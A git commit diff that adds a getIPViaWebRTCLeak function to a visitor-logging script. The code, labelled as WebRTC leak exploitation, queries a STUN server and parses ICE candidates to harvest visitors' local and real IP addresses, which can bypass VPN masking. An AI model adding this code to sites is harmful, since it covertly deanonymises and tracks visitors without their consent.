e7f44bc9b43ef0ac6a5ae5e6b920928caf10a4c0
lwd-temp <26019675+lwd-temp@users.noreply.github.com>
2022-06-29 17:17:25 +0800

    getIPViaWebRTCLeak

--- visitorLogger.js
+++ visitorLogger.js
@@ -159,6 +159,45 @@
         return geoLocation;
     }
 
+    // Get IP via WebRTC Leak Exploitation
+    // https://github.com/VoidSec/WebRTC-Leak/blob/master/exploit.js
+    function getIPViaWebRTCLeak() {
+        var myPeerConnection = window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection;
+        var pc = new myPeerConnection({ iceServers: [{ urls: "stun:stun.l.google.com:19302" }] }),
+            noop = function () { },
+            localIPs = {},
+            ipRegex = /([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/g,
+            key;
+
+        var returnValue = [];
+
+        function onNewIP(ip) {
+            returnValue.push(ip);
+        }
+
+        function ipIterate(ip) {
+            if (!localIPs[ip]) onNewIP(ip);
+            localIPs[ip] = true;
+        }
+
+        pc.createDataChannel("");
+
+        pc.createOffer(function (sdp) {
+            sdp.sdp.split('\n').forEach(function (line) {
+                if (line.indexOf('candidate') < 0) return;
+                line.match(ipRegex).forEach(ipIterate);
+            });
+            pc.setLocalDescription(sdp, noop, noop);
+        }, noop);
+
+        pc.onicecandidate = function (ice) {
+            if (!ice || !ice.candidate || !ice.candidate.candidate || !ice.candidate.candidate.match(ipRegex)) return;
+            ice.candidate.candidate.match(ipRegex).forEach(ipIterate);
+        };
+
+        return returnValue;
+    }
+
 
     // Generate ext data from getUserInfo()
     function getExtData() {
